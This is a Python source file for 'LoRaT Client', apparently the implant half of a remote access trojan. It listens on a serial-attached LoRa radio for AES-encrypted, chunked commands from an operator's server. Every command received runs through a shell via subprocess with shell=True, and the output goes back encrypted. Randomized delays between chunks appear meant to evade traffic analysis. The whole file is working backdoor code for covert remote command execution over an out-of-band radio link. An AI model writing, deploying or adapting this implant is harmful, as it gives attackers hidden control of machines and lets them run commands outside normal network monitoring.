#!/usr/bin/env python3
import serial
import time
import threading
import argparse
import subprocess
import random
import string
import re
from crypto import LoRaTCrypto


def generate_msg_id(length=6):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))


def jittered_delay(min_seconds=2.0, max_seconds=4.0):
    delay = random.uniform(min_seconds, max_seconds)
    time.sleep(delay)
    return delay


class LoRaTClient:
    def __init__(self, serial_port, baudrate=115200, key=None):
        self.serial_port = serial_port
        self.baudrate = baudrate
        self.serial_conn = None
        self.running = False
        self.last_received = "<none>"
        self.last_sent = "<none>"
        self.sent_count = 0
        self.recv_count = 0
        self.sending_response = False
        self.send_lock = threading.Lock()
        self.CHUNK_SIZE = 180

        self.chunk_buffers = {}
        self.chunk_lock = threading.Lock()

        if key:
            self.crypto = LoRaTCrypto(key)
        else:
            print("[!] No encryption key provided. Generating a new one.")
            self.crypto = LoRaTCrypto()
            print(f"[+] Generated new key (save this for the server): {self.crypto.get_key_b64()}")

    def connect_serial(self):
        try:
            self.serial_conn = serial.Serial(
                port=self.serial_port,
                baudrate=self.baudrate,
                timeout=1
            )
            print(f"[+] Connected to {self.serial_port} at {self.baudrate} baud")
            return True
        except Exception as e:
            print(f"[!] Failed to connect to serial port: {e}")
            return False

    def chunk_data(self, data):
        msg_id = generate_msg_id()
        chunks = []
        data_len = len(data)
        total_chunks = (data_len + self.CHUNK_SIZE - 1) // self.CHUNK_SIZE

        for i in range(total_chunks):
            start = i * self.CHUNK_SIZE
            end = min(start + self.CHUNK_SIZE, data_len)
            chunk = data[start:end]
            frame = f"[{msg_id}:{i+1}/{total_chunks}]{chunk}"
            chunks.append(frame)

        return chunks

    def send_command(self, command):
        if not self.serial_conn or not self.serial_conn.is_open:
            print("[!] Serial connection not available")
            return False

        try:
            command = command.strip()
            if not command:
                return False

            encrypted_cmd = self.crypto.encrypt(command)
            if not encrypted_cmd:
                print("[!] Failed to encrypt command")
                return False

            chunks = self.chunk_data(encrypted_cmd)

            for i, chunk in enumerate(chunks):
                if i > 0:
                    delay = jittered_delay(2.0, 4.0)
                    print(f"[+] Jittered delay: {delay:.2f}s before chunk {i+1}")
                
                self.serial_conn.write((chunk + '\n').encode('utf-8'))
                self.serial_conn.flush()

            self.last_sent = command
            self.sent_count += 1
            print(f"[TX {self.sent_count}] ({len(chunks)} chunk(s)) {command}")
            return True
        except Exception as e:
            print(f"[!] Failed to send command: {e}")
            return False

    def _parse_frame(self, data):
        try:
            if not data.startswith('['):
                return None
            bracket_end = data.index(']')
            meta = data[1:bracket_end]
            payload = data[bracket_end + 1:]

            msg_id, position = meta.split(':')
            current, total = position.split('/')
            return msg_id, int(current), int(total), payload
        except (ValueError, IndexError):
            return None

    def _handle_chunk(self, msg_id, current, total, payload):
        with self.chunk_lock:
            if msg_id not in self.chunk_buffers:
                self.chunk_buffers[msg_id] = {'total': total, 'chunks': {}}

            self.chunk_buffers[msg_id]['chunks'][current] = payload

            if len(self.chunk_buffers[msg_id]['chunks']) == total:
                assembled = ''.join(
                    self.chunk_buffers[msg_id]['chunks'][i]
                    for i in range(1, total + 1)
                )
                del self.chunk_buffers[msg_id]
                return assembled

        return None

    def _is_valid_base64(self, s):
        try:
            pattern = re.compile(r'^[A-Za-z0-9+/]*={0,2}$')
            return bool(pattern.match(s)) and len(s) % 4 == 0
        except:
            return False

    def read_serial(self):
        if not self.serial_conn or not self.serial_conn.is_open:
            return ""

        if self.sending_response:
            return ""

        try:
            if self.serial_conn.in_waiting > 0:
                raw_data = self.serial_conn.readline()
                if not raw_data:
                    return ""

                try:
                    data = raw_data.decode('utf-8').strip()
                except UnicodeDecodeError:
                    data = raw_data.decode('utf-8', errors='replace').strip()

                if not data:
                    return ""

                parsed = self._parse_frame(data)
                if parsed:
                    msg_id, current, total, payload = parsed
                    complete = self._handle_chunk(msg_id, current, total, payload)
                    if complete is None:
                        return ""
                    encrypted_data = complete
                else:
                    encrypted_data = data

                if not self._is_valid_base64(encrypted_data):
                    print(f"[!] Invalid base64 data received: {encrypted_data[:50]}...")
                    return ""

                decrypted_data = self.crypto.decrypt(encrypted_data)
                if not decrypted_data:
                    print("[!] Failed to decrypt received data")
                    return ""

                self.last_received = decrypted_data
                self.recv_count += 1
                print(f"[RX {self.recv_count}] {decrypted_data}")

                response = self.process_command(decrypted_data)
                if response:
                    with self.send_lock:
                        self.sending_response = True
                        self.send_command(response)
                        self.sending_response = False

                return decrypted_data

        except Exception as e:
            print(f"[!] Error reading from serial: {e}")

        return ""

    def process_command(self, command):
        print(f"[+] Executing command: {command}")
        try:
            result = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=10
            )
            output = result.stdout.strip()
            error = result.stderr.strip()

            if output:
                return f"RESPONSE: {output}"
            elif error:
                return f"ERROR: {error}"
            else:
                return "RESPONSE: Command executed successfully"

        except subprocess.TimeoutExpired:
            return "ERROR: Command timed out"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def start(self):
        self.running = True

        if not self.connect_serial():
            return False

        print("[+] LoRaT Client started. Waiting for commands from server...")

        read_thread = threading.Thread(target=self._read_loop)
        read_thread.daemon = True
        read_thread.start()

        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
        finally:
            self.stop()

        return True

    def _read_loop(self):
        while self.running:
            self.read_serial()
            time.sleep(0.05)

    def stop(self):
        self.running = False
        if self.serial_conn and self.serial_conn.is_open:
            self.serial_conn.close()
            print("[+] Serial connection closed")
        print("[+] LoRaT Client stopped")


def main():
    parser = argparse.ArgumentParser(description='LoRaT Client')
    parser.add_argument('--port', required=True, help='Serial port (e.g., /dev/ttyACM0, COM3)')
    parser.add_argument('--baudrate', type=int, default=115200, help='Serial baudrate (default: 115200)')
    parser.add_argument('--key', help='Base64 encoded AES-256 key (must match server key)')

    args = parser.parse_args()

    key = None
    if args.key:
        key = LoRaTCrypto.set_key_from_b64(args.key)

    client = LoRaTClient(
        serial_port=args.port,
        baudrate=args.baudrate,
        key=key
    )
    client.start()


if __name__ == '__main__':
    main()